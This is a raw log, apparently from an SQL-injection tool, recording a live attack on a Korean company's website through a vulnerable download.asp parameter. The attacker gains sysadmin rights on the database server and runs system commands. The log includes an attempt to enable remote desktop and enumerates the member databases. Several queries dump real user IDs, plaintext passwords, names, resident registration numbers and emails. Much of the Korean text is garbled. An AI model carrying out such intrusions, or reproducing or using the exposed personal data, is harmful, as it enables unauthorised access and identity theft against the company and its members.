@@ -1,0 +1,1701 @@
+■漏洞信息:============================================================
+ ·URL:http://www.mooneng.co.kr/board/download.asp?Id=pds&ref=18&step=1
+ ·页面标题：
+ ·参数:Id=pds&ref=18&step=1
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:211.219.141.2
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Mon, 04 Apr 2011 09:54:36 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Disposition: attachment; filename=家橇飘傀绢魂诀柳蕊过[2010.3.31 过伏 力10220龋].hwp
+Content-Length: 31744
+Content-Length: 31744
+Content-Type: application/unknown
+Set-Cookie: ASPSESSIONIDQCACADRB=NIIFOCFAMDPGMCKAOALMCIOA; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：Mooneng
+- 用户名：dbo
+- 版本：Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86) 
+	Oct 14 2005 00:33:37 
+	Copyright (c) 1988-2005 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：MOON_KMS
+- 服务名：MSSQLSERVER
+- 系统用户名：MoonHome
+
+■发现SQL2005，建议您先切换到 '杂项工具' 标签页面开启相关设置。
+ ·当前用户权限：
+sysadmin(sa): 1
+dbcreator): 1
+bulkadmin: 1
+diskadmin: 1
+serveradmin: 1
+public: 1
+db_owner: 1
+db_backupoperator: 1
+db_datawriter: 1
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+master	C:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\master.mdf	
+tempdb	C:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\tempdb.mdf	
+model	C:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\model.mdf	
+msdb	C:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\MSDBData.mdf	
+TimeSheet	C:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\TimeSheet.mdf	
+dongyang	d:\microsoft sql server\MSSQL\data\dongyang_Data.MDF	
+Mooneng	C:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\Mooneng.mdf	
+DongHome	C:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\DongHome.mdf	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+public		?..?.???????慃	04  8 2003  9:10AM	
+dbo			04  8 2003  9:10AM	
+guest		.	04  8 2003  9:10AM	
+##MS_AgentSigningCertificate##		?..?.）?????甋???	10 14 2005  1:56AM	
+MOON_KMS\SQLServer2005MSFTEUser$MOON_KMS$MSSQLSERVER		?..?.匆?????.	12 14 2006  6:37PM	
+db_owner		?..?.......?.	04  8 2003  9:10AM	
+db_accessadmin		?..?.......?.	04  8 2003  9:10AM	
+db_securityadmin		?..?.......?.	04  8 2003  9:10AM	
+db_ddladmin		?..?.......?.	04  8 2003  9:10AM	
+db_backupoperator		?..?.......?.	04  8 2003  9:10AM	
+db_datareader		?..?.......?.	04  8 2003  9:10AM	
+db_datawriter		?..?.......?.	04  8 2003  9:10AM	
+db_denydatareader		?..?.......?.	04  8 2003  9:10AM	
+db_denydatawriter		?..?.......?.	04  8 2003  9:10AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+	background			RESOURCE MONITOR		
+.Net SqlClient Data Provider	sleeping	MOON_KMS	2760	AWAITING COMMAND		
+.Net SqlClient Data Provider	sleeping	MOON_KMS	2760	AWAITING COMMAND		
+.Net SqlClient Data Provider	sleeping	MOON_KMS	2760	AWAITING COMMAND		
+.Net SqlClient Data Provider	sleeping	MOON_KMS	2760	AWAITING COMMAND		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+MOON_KMS	SQL Server	SQLOLEDB	MOON_KMS		MOON_KMS	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+■reg query "HKLM\SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots" /V "/"
+1	坷幅: 坷幅: 矫胶袍捞 瘤沥等 饭瘤胶飘府 虐 肚绰 蔼阑 茫阑 荐 绝嚼聪促.	
+2		
+■ipconfig
+1		
+2	Windows IP Configuration	
+3		
+4		
+5	Ethernet adapter 肺拿 康开 楷搬:	
+6		
+7	   Connection-specific DNS Suffix  . : 	
+8	   IP Address. . . . . . . . . . . . : 211.219.141.9	
+9	   Subnet Mask . . . . . . . . . . . : 255.255.255.0	
+10	   Default Gateway . . . . . . . . . : 211.219.141.254	
+11		
+■REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber
+1		
+2	HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp	
+3	    PortNumber    REG_DWORD    0xd3d	
+4		
+5		
+■cscript c:\vWeb.vbs
+1	Microsoft (R) Windows Script Host 滚傈 5.6	
+2	Copyright (C) Microsoft Corporation 1996-2001. All rights reserved.	
+3		
+4	涝仿 坷幅: 胶农赋飘 颇老 "c:\vWeb.vbs"阑(甫) 茫阑 荐 绝嚼聪促.	
+5		
+■dir c:\vWeb.vbs
+1	 C 靛扼捞宏狼 杭俘俊绰 捞抚捞 绝嚼聪促.	
+2	 杭俘 老访 锅龋: 6851-0180	
+3		
+4	 c:\ 叼泛磐府	
+5		
+6	颇老阑 茫阑 荐 绝嚼聪促.	
+7		
+Dir of D:: 
+
+券版 促款肺靛\
+Down\
+FTP\
+Inetpub\
+ING_Dream\
+METSWeb\
+Microsoft SQL Server\
+MoonengDB\
+MoonWeb(New)\
+nxsensor-CPU 柯档螟沥\
+oracle\
+pwalker\
+RECYCLER\
+sensors_view_pro3_CPU柯档\
+System Volume Information\
+TimeSheet\
+Toad\
+Tomcat 4.1\
+坷扼努 抛捞喉 胶其捞胶.txt
+dbpool.log
+dongyang.bak
+EnvPatch.exe
+ko_vs_2005_Team Suit_dvd.iso
+lgs99.dmp
+TimeSheet.bak
+TimeSheet2.bak
+
+Dir of D:\MoonWeb(New): 
+
+ad_board\
+ADMIN\
+aspnet_client\
+board\
+BusinessInfo\
+company\
+css\
+cyber\
+email\
+fla\
+flv\
+image\
+img\
+includefile\
+intranet\
+job\
+join\
+js\
+pop\
+popup\
+Results\
+support\
+swf\
+xml\
+default.asp
+fla.js
+footer.jpg
+global.asa
+main.asp
+sitemap.asp
+
+■正在获取文件属性：
+文件名:D:\MoonWeb(New)\q.asp
+
+■正在获取文件属性：
+文件名:D:\MoonWeb(New)\q.asp
+
+■正在获取文件属性：
+文件名:D:\MoonWeb(New)\q.asp
+
+■reg query "HKLM\SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots" /V "/"
+1	坷幅: 坷幅: 矫胶袍捞 瘤沥等 饭瘤胶飘府 虐 肚绰 蔼阑 茫阑 荐 绝嚼聪促.	
+2		
+■ipconfig
+1		
+2	Windows IP Configuration	
+3		
+4		
+5	Ethernet adapter 肺拿 康开 楷搬:	
+6		
+7	   Connection-specific DNS Suffix  . : 	
+8	   IP Address. . . . . . . . . . . . : 211.219.141.9	
+9	   Subnet Mask . . . . . . . . . . . : 255.255.255.0	
+10	   Default Gateway . . . . . . . . . : 211.219.141.254	
+11		
+
+■数据库信息:============================================================
+- 数据库名：Mooneng
+- 用户名：dbo
+- 版本：Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86) 
+	Oct 14 2005 00:33:37 
+	Copyright (c) 1988-2005 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：MOON_KMS
+- 服务名：MSSQLSERVER
+- 系统用户名：MoonHome
+
+■发现SQL2005，建议您先切换到 '杂项工具' 标签页面开启相关设置。
+ ·当前用户权限：
+sysadmin(sa): 1
+dbcreator): 1
+bulkadmin: 1
+diskadmin: 1
+serveradmin: 1
+public: 1
+db_owner: 1
+db_backupoperator: 1
+db_datawriter: 1
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+master	C:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\master.mdf	
+tempdb	C:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\tempdb.mdf	
+model	C:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\model.mdf	
+msdb	C:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\MSDBData.mdf	
+TimeSheet	C:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\TimeSheet.mdf	
+dongyang	d:\microsoft sql server\MSSQL\data\dongyang_Data.MDF	
+Mooneng	C:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\Mooneng.mdf	
+DongHome	C:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\DongHome.mdf	
+Mooneng_eng	C:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\Mooneng_new.mdf	
+DongHome_eng	C:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\DongHome_eng.mdf	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+public		?..?.???????慃	04  8 2003  9:10AM	
+dbo			04  8 2003  9:10AM	
+guest		.	04  8 2003  9:10AM	
+##MS_AgentSigningCertificate##		?..?.）?????甋???	10 14 2005  1:56AM	
+MOON_KMS\SQLServer2005MSFTEUser$MOON_KMS$MSSQLSERVER		?..?.匆?????.	12 14 2006  6:37PM	
+db_owner		?..?.......?.	04  8 2003  9:10AM	
+db_accessadmin		?..?.......?.	04  8 2003  9:10AM	
+db_securityadmin		?..?.......?.	04  8 2003  9:10AM	
+db_ddladmin		?..?.......?.	04  8 2003  9:10AM	
+db_backupoperator		?..?.......?.	04  8 2003  9:10AM	
+db_datareader		?..?.......?.	04  8 2003  9:10AM	
+db_datawriter		?..?.......?.	04  8 2003  9:10AM	
+db_denydatareader		?..?.......?.	04  8 2003  9:10AM	
+db_denydatawriter		?..?.......?.	04  8 2003  9:10AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+	background			RESOURCE MONITOR		
+SQLAgent - Generic Refresher	sleeping	MOON_KMS	3552	AWAITING COMMAND	NETWORK SERVICE	
+SQLAgent - Generic Refresher	sleeping	MOON_KMS	3552	AWAITING COMMAND	NETWORK SERVICE	
+SQLAgent - Generic Refresher	sleeping	MOON_KMS	3552	AWAITING COMMAND	NETWORK SERVICE	
+SQLAgent - Generic Refresher	sleeping	MOON_KMS	3552	AWAITING COMMAND	NETWORK SERVICE	
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+MOON_KMS	SQL Server	SQLOLEDB	MOON_KMS		MOON_KMS	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+------------------------------------------------------------
+正在获取数据库 [Mooneng] 的表名……
+ custom_counseller
+display_board
+shop_member
+faq_list
+visit_counter
+CodeBook
+popup_list
+BoardUserList
+CertificateList
+employ_applist
+EmployDepartMent
+visit_apply
+mailsend_member
+zip
+EmployNoticeMaster
+EmployApplyList
+AuthList
+sysc
+BoardReturnViewLog
+smssend_member
+SMSData
+gicho
+BoardManager
+BoardTopList
+PollMaster
+AttachFile
+AuthLog
+PollItem
+BoardContent
+syscommand
+PollApplyList
+BoardReply
+PartManager
+ad_board
+agency_list
+D99_CMD
+t_t
+BoardSubtype
+BoardList
+counsel
+custom_counsel
+
+------------------------------------------------------------
+正在获取 [Mooneng].[SMSData] 的列名……
+ seqno
+InDate
+InTime
+Member
+SendId
+SendName
+Rphone1
+Rphone2
+Rphone3
+RecvName
+Sphone1
+Sphone2
+Sphone3
+Msg
+Url
+Rdate
+Rtime
+Result
+Kind
+ErrCode
+RecvTime
+
+------------------------------------------------------------
+正在获取 [Mooneng].[smssend_member] 的列名……
+ num
+mailtype
+title
+sender
+sendertel
+mem_grade
+emdeptcd
+mail_count
+send_nal
+sender_id
+content
+
+正在执行查询：select top 3 mem_grade,mail_count,sender_id,content from Mooneng..smssend_member order by content
+------------------------------------------------------------
+正在获取 [Mooneng].[mailsend_member] 的列名……
+ num
+mailtype
+title
+sender
+sendermail
+mem_grade
+emdeptcd
+mail_count
+send_nal
+sender_id
+content
+
+------------------------------------------------------------
+正在获取 [Mooneng].[shop_member] 的列名……
+ mem_idx
+userid
+passwd
+name
+jumin
+gender
+birthday
+b_year
+b_type
+post
+area
+addr
+addr_res
+email
+tel
+mobile
+mail_service
+job
+motiv
+mem_grade
+mem_stat
+recom_id
+ent_nal
+
+正在执行查询：select top 3 mem_idx,userid,passwd,name,jumin,email from Mooneng..shop_member order by email
+5	master	21222122	包府磊	000000000000		
+------------------------------------------------------------
+正在获取 [Mooneng].[BoardUserList] 的列名……
+ Id
+userid
+
+正在执行查询：select top 3 Id,userid from Mooneng..BoardUserList order by userid
+正在执行查询：select top 3 Id,userid from Mooneng..BoardUserList order by userid
+------------------------------------------------------------
+正在获取 [Mooneng].[employ_applist] 的列名……
+ num
+part
+name
+tel
+email
+addr
+attachfile
+comment
+isopen
+opendate
+isview
+viewdate
+ent_nal
+
+正在执行查询：select top 3 num,name,email,addr from Mooneng..employ_applist order by addr
+------------------------------------------------------------
+正在获取数据库 [dongyang] 的表名……
+ BOARD_CATEGORY
+BOARD_COMMENT
+BOARD_CONFIG
+LOG_TABLE
+MEMBER_TABLE
+POPUP_TABLE
+BOARD_1166457420
+BOARD_1166460633
+BOARD_1166461334
+BOARD_1170095569
+BOARD_1170097261
+BOARD_1170097327
+BOARD_ADMIN
+dtproperties
+
+------------------------------------------------------------
+正在获取 [dongyang].[MEMBER_TABLE] 的列名……
+ IDX
+M_ID
+M_PWD
+M_NAME
+M_EMAIL
+M_SSH
+M_TEL
+M_HP
+M_ZIP
+M_ADDRESS1
+M_ADDRESS2
+M_LOGIN_COUNT
+M_WRITEDAY
+M_LAST_LOGIN
+M_LEVEL
+M_MAILING_U
+
+正在执行查询：select top 3 IDX,M_ID,M_PWD,M_NAME,M_EMAIL from dongyang..MEMBER_TABLE order by M_EMAIL
+正在执行查询：select top 3 IDX,M_ID,M_PWD,M_NAME,M_EMAIL from dongyang..MEMBER_TABLE order by M_EMAIL
+正在执行查询：select top 3 IDX,M_ID,M_PWD,M_NAME,M_EMAIL from dongyang..MEMBER_TABLE order by M_EMAIL
+正在执行查询：select top 3 M_ID,M_PWD,M_NAME,M_EMAIL from dongyang..MEMBER_TABLE order by IDX
+------------------------------------------------------------
+正在获取数据库 [DongHome] 的表名……
+ custom_counseller
+display_board
+shop_member
+faq_list
+visit_counter
+CodeBook
+popup_list
+BoardUserList
+CertificateList
+employ_applist
+EmployDepartMent
+visit_apply
+mailsend_member
+zip
+EmployNoticeMaster
+EmployApplyList
+AuthList
+BoardReturnViewLog
+smssend_member
+SMSData
+gicho
+BoardManager
+BoardTopList
+PollMaster
+AttachFile
+AuthLog
+PollItem
+BoardContent
+PollApplyList
+BoardReply
+PartManager
+ad_board
+agency_list
+BoardSubtype
+BoardList
+counsel
+custom_counsel
+
+------------------------------------------------------------
+正在获取 [DongHome].[mailsend_member] 的列名……
+ num
+mailtype
+title
+sender
+sendermail
+mem_grade
+emdeptcd
+mail_count
+send_nal
+sender_id
+content
+
+正在执行查询：select top 3 sendermail,mem_grade from DongHome..mailsend_member order by sendermail
+正在执行查询：select top 3 sendermail,mem_grade,sender_id from DongHome..mailsend_member order by sender_id
+------------------------------------------------------------
+正在获取 [DongHome].[shop_member] 的列名……
+ mem_idx
+userid
+passwd
+name
+jumin
+gender
+birthday
+b_year
+b_type
+post
+area
+addr
+addr_res
+email
+tel
+mobile
+mail_service
+job
+motiv
+mem_grade
+mem_stat
+recom_id
+ent_nal
+
+正在执行查询：select top 3 mem_idx,userid,passwd,name,jumin from DongHome..shop_member order by jumin
+5	master	21222122	包府磊	000000000000	
+4	onboo	1111	弥焊泅	7511141226316	
+6	testtms	1111	坷脚龋	5511131380719	
+正在执行查询：select top 2147483647 mem_idx,userid,passwd,name,jumin,email from DongHome..shop_member order by email
+5	master	21222122	包府磊	000000000000		
+4	onboo	1111	弥焊泅	7511141226316	onboo@hotmail.com	
+6	testtms	1111	坷脚龋	5511131380719	blaze1106@naver.com	
+------------------------------------------------------------
+正在获取 [DongHome].[BoardManager] 的列名……
+ Id
+Gubun
+Board_name
+PageSize
+ReadOnly
+Attach
+Reply
+FileUpload
+FileMaxSize
+MemOnly
+UseGrade
+DeptCode
+CateGory
+ManagerId
+Datetime
+DisplayOrder
+
+------------------------------------------------------------
+正在获取 [DongHome].[smssend_member] 的列名……
+ num
+mailtype
+title
+sender
+sendertel
+mem_grade
+emdeptcd
+mail_count
+send_nal
+sender_id
+content
+
+------------------------------------------------------------
+正在获取 [DongHome].[EmployNoticeMaster] 的列名……
+ idxnum
+title
+deptlarge
+deptmiddle
+workarea
+mainwork
+employtype
+schooltype
+minage
+maxage
+sextype
+etcmemo
+payinfo
+welfaretype
+etcwelfare
+startdate
+enddate
+documentinfo
+selectioninfo
+damname
+damemail
+damtel
+dammobile
+contents
+createdate
+createuser
+updatedate
+updateuser
+
+------------------------------------------------------------
+正在获取数据库 [Mooneng_eng] 的表名……
+ faq_list
+visit_counter
+CodeBook
+popup_list
+BoardUserList
+CertificateList
+employ_applist
+EmployDepartMent
+visit_apply
+mailsend_member
+zip
+EmployNoticeMaster
+EmployApplyList
+AuthList
+BoardReturnViewLog
+smssend_member
+SMSData
+gicho
+BoardManager
+BoardTopList
+PollMaster
+AttachFile
+AuthLog
+PollItem
+BoardContent
+PollApplyList
+BoardReply
+PartManager
+ad_board
+agency_list
+BoardSubtype
+counsel
+custom_counsel
+BoardList
+custom_counseller
+display_board
+shop_member
+
+------------------------------------------------------------
+正在获取 [Mooneng_eng].[mailsend_member] 的列名……
+ num
+mailtype
+title
+sender
+sendermail
+mem_grade
+emdeptcd
+mail_count
+send_nal
+sender_id
+content
+
+------------------------------------------------------------
+正在获取 [Mooneng_eng].[BoardUserList] 的列名……
+ Id
+userid
+
+------------------------------------------------------------
+正在获取 [Mooneng_eng].[faq_list] 的列名……
+ num
+question
+answer
+kind
+ent_nal
+
+------------------------------------------------------------
+正在获取 [Mooneng_eng].[visit_counter] 的列名……
+ vNum
+vIP
+vYY
+vMM
+vDD
+vHH
+vMT
+vSeason
+vDW
+vBrowser
+vOS
+vReferer
+vTarget
+vUser_agent
+
+------------------------------------------------------------
+正在获取 [Mooneng_eng].[CodeBook] 的列名……
+ typename
+typecode
+codename
+isuse
+
+------------------------------------------------------------
+正在获取 [Mooneng_eng].[popup_list] 的列名……
+ pid
+popup_name
+wsize
+hsize
+leftsize
+topsize
+use_ok
+content
+
+------------------------------------------------------------
+正在获取 [Mooneng_eng].[PartManager] 的列名……
+ sosokcd
+sosokname
+ManagerId
+isuse
+
+正在执行查询：select top 2147483647 sosokcd,sosokname,ManagerId,isuse from Mooneng_eng..PartManager order by sosokcd
+------------------------------------------------------------
+正在获取 [Mooneng_eng].[shop_member] 的列名……
+ mem_idx
+userid
+passwd
+name
+jumin
+gender
+birthday
+b_year
+b_type
+post
+area
+addr
+addr_res
+email
+tel
+mobile
+mail_service
+job
+motiv
+mem_grade
+mem_stat
+recom_id
+ent_nal
+
+正在执行查询：select top 2147483647 mem_idx,userid,passwd,name,jumin,email from Mooneng_eng..shop_member order by email
+5	master	21222122	包府磊	000000000000		
+------------------------------------------------------------
+正在获取数据库 [DongHome_eng] 的表名……
+ faq_list
+visit_counter
+CodeBook
+popup_list
+BoardUserList
+CertificateList
+employ_applist
+EmployDepartMent
+visit_apply
+mailsend_member
+zip
+EmployNoticeMaster
+EmployApplyList
+AuthList
+BoardReturnViewLog
+smssend_member
+SMSData
+gicho
+BoardManager
+BoardTopList
+PollMaster
+AttachFile
+AuthLog
+PollItem
+BoardContent
+PollApplyList
+BoardReply
+PartManager
+ad_board
+agency_list
+BoardSubtype
+BoardList
+counsel
+custom_counsel
+custom_counseller
+display_board
+shop_member
+
+------------------------------------------------------------
+正在获取 [DongHome_eng].[shop_member] 的列名……
+ mem_idx
+userid
+passwd
+name
+jumin
+gender
+birthday
+b_year
+b_type
+post
+area
+addr
+addr_res
+email
+tel
+mobile
+mail_service
+job
+motiv
+mem_grade
+mem_stat
+recom_id
+ent_nal
+
+正在执行查询：select top 2147483647 mem_idx,userid,passwd from DongHome_eng..shop_member order by passwd
+5	master	21222122	
+4	onboo	1111	
+
+
+■数据库信息:============================================================
+- 数据库名：Mooneng
+- 用户名：dbo
+- 版本：Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86) 
+	Oct 14 2005 00:33:37 
+	Copyright (c) 1988-2005 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：MOON_KMS
+- 服务名：MSSQLSERVER
+- 系统用户名：MoonHome
+
+■发现SQL2005，建议您先切换到 '杂项工具' 标签页面开启相关设置。
+ ·当前用户权限：
+sysadmin(sa): 1
+dbcreator): 1
+bulkadmin: 1
+diskadmin: 1
+serveradmin: 1
+public: 1
+db_owner: 1
+db_backupoperator: 1
+db_datawriter: 1
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+master	C:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\master.mdf	
+tempdb	C:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\tempdb.mdf	
+model	C:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\model.mdf	
+msdb	C:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\MSDBData.mdf	
+TimeSheet	C:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\TimeSheet.mdf	
+dongyang	d:\microsoft sql server\MSSQL\data\dongyang_Data.MDF	
+Mooneng	C:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\Mooneng.mdf	
+DongHome	C:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\DongHome.mdf	
+Mooneng_eng	C:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\Mooneng_new.mdf	
+DongHome_eng	C:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\DongHome_eng.mdf	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+public		?..?.???????慃	04  8 2003  9:10AM	
+dbo			04  8 2003  9:10AM	
+guest		.	04  8 2003  9:10AM	
+##MS_AgentSigningCertificate##		?..?.）?????甋???	10 14 2005  1:56AM	
+MOON_KMS\SQLServer2005MSFTEUser$MOON_KMS$MSSQLSERVER		?..?.匆?????.	12 14 2006  6:37PM	
+db_owner		?..?.......?.	04  8 2003  9:10AM	
+db_accessadmin		?..?.......?.	04  8 2003  9:10AM	
+db_securityadmin		?..?.......?.	04  8 2003  9:10AM	
+db_ddladmin		?..?.......?.	04  8 2003  9:10AM	
+db_backupoperator		?..?.......?.	04  8 2003  9:10AM	
+db_datareader		?..?.......?.	04  8 2003  9:10AM	
+db_datawriter		?..?.......?.	04  8 2003  9:10AM	
+db_denydatareader		?..?.......?.	04  8 2003  9:10AM	
+db_denydatawriter		?..?.......?.	04  8 2003  9:10AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+	background			RESOURCE MONITOR		
+SQLAgent - Generic Refresher	sleeping	MOON_KMS	3552	AWAITING COMMAND	NETWORK SERVICE	
+SQLAgent - Generic Refresher	sleeping	MOON_KMS	3552	AWAITING COMMAND	NETWORK SERVICE	
+SQLAgent - Generic Refresher	sleeping	MOON_KMS	3552	AWAITING COMMAND	NETWORK SERVICE	
+SQLAgent - Generic Refresher	sleeping	MOON_KMS	3552	AWAITING COMMAND	NETWORK SERVICE	
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+MOON_KMS	SQL Server	SQLOLEDB	MOON_KMS		MOON_KMS	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+■reg query "HKLM\SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots" /V "/"
+1	坷幅: 坷幅: 矫胶袍捞 瘤沥等 饭瘤胶飘府 虐 肚绰 蔼阑 茫阑 荐 绝嚼聪促.	
+2		
+■ipconfig
+1		
+2	Windows IP Configuration	
+3		
+4		
+5	Ethernet adapter 肺拿 康开 楷搬:	
+6		
+7	   Connection-specific DNS Suffix  . : 	
+8	   IP Address. . . . . . . . . . . . : 211.219.141.9	
+9	   Subnet Mask . . . . . . . . . . . : 255.255.255.0	
+10	   Default Gateway . . . . . . . . . : 211.219.141.254	
+11		
+■REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber
+1		
+2	HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp	
+3	    PortNumber    REG_DWORD    0xd3d	
+4		
+5		
+■REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+1	坷幅: 咀技胶啊 芭何登菌嚼聪促.	
+2		
+■netstat -an
+1		
+2	Active Connections	
+3		
+4	  Proto  Local Address          Foreign Address        State	
+5	  TCP    0.0.0.0:7              0.0.0.0:0              LISTENING	
+6	  TCP    0.0.0.0:9              0.0.0.0:0              LISTENING	
+7	  TCP    0.0.0.0:13             0.0.0.0:0              LISTENING	
+8	  TCP    0.0.0.0:17             0.0.0.0:0              LISTENING	
+9	  TCP    0.0.0.0:19             0.0.0.0:0              LISTENING	
+10	  TCP    0.0.0.0:42             0.0.0.0:0              LISTENING	
+11	  TCP    0.0.0.0:53             0.0.0.0:0              LISTENING	
+12	  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING	
+13	  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING	
+14	  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING	
+15	  TCP    0.0.0.0:1025           0.0.0.0:0              LISTENING	
+16	  TCP    0.0.0.0:1026           0.0.0.0:0              LISTENING	
+17	  TCP    0.0.0.0:1027           0.0.0.0:0              LISTENING	
+18	  TCP    0.0.0.0:1030           0.0.0.0:0              LISTENING	
+19	  TCP    0.0.0.0:1032           0.0.0.0:0              LISTENING	
+20	  TCP    0.0.0.0:1033           0.0.0.0:0              LISTENING	
+21	  TCP    0.0.0.0:1337           0.0.0.0:0              LISTENING	
+22	  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING	
+23	  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING	
+24	  TCP    0.0.0.0:3372           0.0.0.0:0              LISTENING	
+25	  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING	
+26	  TCP    0.0.0.0:11798          0.0.0.0:0              LISTENING	
+27	  TCP    127.0.0.1:1027         127.0.0.1:1518         ESTABLISHED	
+28	  TCP    127.0.0.1:1034         0.0.0.0:0              LISTENING	
+29	  TCP    127.0.0.1:1038         127.0.0.1:3306         ESTABLISHED	
+30	  TCP    127.0.0.1:1434         0.0.0.0:0              LISTENING	
+31	  TCP    127.0.0.1:1518         127.0.0.1:1027         ESTABLISHED	
+32	  TCP    127.0.0.1:1643         127.0.0.1:3306         ESTABLISHED	
+33	  TCP    127.0.0.1:3306         127.0.0.1:1038         ESTABLISHED	
+34	  TCP    127.0.0.1:3306         127.0.0.1:1643         ESTABLISHED	
+35	  TCP    127.0.0.1:42424        0.0.0.0:0              LISTENING	
+36	  TCP    127.0.0.1:43958        0.0.0.0:0              LISTENING	
+37	  TCP    211.219.141.9:1433     211.219.141.2:2367     ESTABLISHED	
+38	  TCP    211.219.141.9:1433     211.219.141.4:11575    ESTABLISHED	
+39	  TCP    211.219.141.9:1433     211.219.141.4:12273    ESTABLISHED	
+40	  TCP    211.219.141.9:1433     211.219.141.4:48823    ESTABLISHED	
+41	  TCP    211.219.141.9:1433     211.219.141.4:56601    ESTABLISHED	
+42	  TCP    211.219.141.9:1433     211.219.141.4:59181    ESTABLISHED	
+43	  TCP    211.219.141.9:1433     211.219.141.4:62971    ESTABLISHED	
+44	  TCP    211.219.141.9:1433     211.219.141.4:65161    ESTABLISHED	
+45	  TCP    211.219.141.9:1433     211.244.1.227:25889    ESTABLISHED	
+46	  UDP    0.0.0.0:7              *:*	
+47	  UDP    0.0.0.0:9              *:*	
+48	  UDP    0.0.0.0:13             *:*	
+49	  UDP    0.0.0.0:17             *:*	
+50	  UDP    0.0.0.0:19             *:*	
+51	  UDP    0.0.0.0:42             *:*	
+52	  UDP    0.0.0.0:161            *:*	
+53	  UDP    0.0.0.0:445            *:*	
+54	  UDP    0.0.0.0:500            *:*	
+55	  UDP    0.0.0.0:1645           *:*	
+56	  UDP    0.0.0.0:1646           *:*	
